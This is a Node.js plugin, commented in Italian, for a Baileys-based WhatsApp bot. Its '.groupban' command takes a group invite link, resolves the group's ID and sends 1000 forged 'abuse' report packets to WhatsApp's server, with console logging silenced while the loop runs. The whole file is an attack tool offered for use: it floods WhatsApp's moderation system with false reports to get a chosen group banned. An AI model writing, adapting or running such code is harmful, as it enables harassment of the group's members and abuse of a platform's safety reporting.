// plugin_groupban.js
// Plugin per bot WhatsApp (Node.js/Baileys) - ES Module
// Funzione: .groupban <link> - invio massivo di segnalazioni IQ al server WhatsApp
// NOTA: il ban del gruppo dipende esclusivamente dai sistemi di moderazione di WhatsApp.

let handler = async (m, { conn, args, usedPrefix, command }) => {
    // 1. Verifica presenza del link
    if (!args[0]) return m.reply(`Uso: ${usedPrefix + command} <link-invito>`);

    let link = args[0];

    // 2. Estrazione codice invito dal link
    const match = link.match(/(?:https?:\/\/)?chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);
    if (!match) return m.reply('Link non valido. Formato richiesto: chat.whatsapp.com/XXXXX');
    const inviteCode = match[1];

    // 3. Invio reazione clessidra (⏳)
    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        // 4. Recupero informazioni gruppo tramite codice invito
        const groupInfo = await conn.groupGetInviteInfo(inviteCode);
        const groupJid = groupInfo.id;
        const groupSubject = groupInfo.subject || 'Sconosciuto';

        // 5. Definizione del numero di segnalazioni da inviare
        const REPORT_COUNT = 1000;

        // 6. Costruzione del nodo IQ di segnalazione
        const buildNode = () => ({
            tag: 'iq',
            attrs: {
                to: 's.whatsapp.net',
                type: 'set',
                xmlns: 'w:g2',
                id: conn.generateMessageTag()
            },
            content: [
                {
                    tag: 'reporting',
                    attrs: {
                        jid: groupJid,
                        reason: 'abuse',
                        source: 'invite_link'
                    }
                }
            ]
        });

        // 7. Invio massivo delle segnalazioni (console silenziata)
        const originalError = console.error;
        const originalWarn = console.warn;
        const originalLog = console.log;
        console.error = () => {};
        console.warn = () => {};
        console.log = () => {};

        try {
            for (let i = 0; i < REPORT_COUNT; i++) {
                await conn.sendNode(buildNode());
            }
        } finally {
            console.error = originalError;
            console.warn = originalWarn;
            console.log = originalLog;
        }

        // 8. Conferma in chat
        await m.reply(`✅ Segnalazioni inviate (${REPORT_COUNT}). Gruppo: ${groupSubject}`);

    } catch (e) {
        // Gestione errori silenziosa, output solo in chat
        await m.reply(`❌ Errore: ${e.message || 'Impossibile elaborare la richiesta'}`);
    }
};

// Metadati handler
handler.help = ['groupban <link>'];
handler.tags = ['tools'];
handler.command = /^(groupban|gb|banchat)$/i;

export default handler;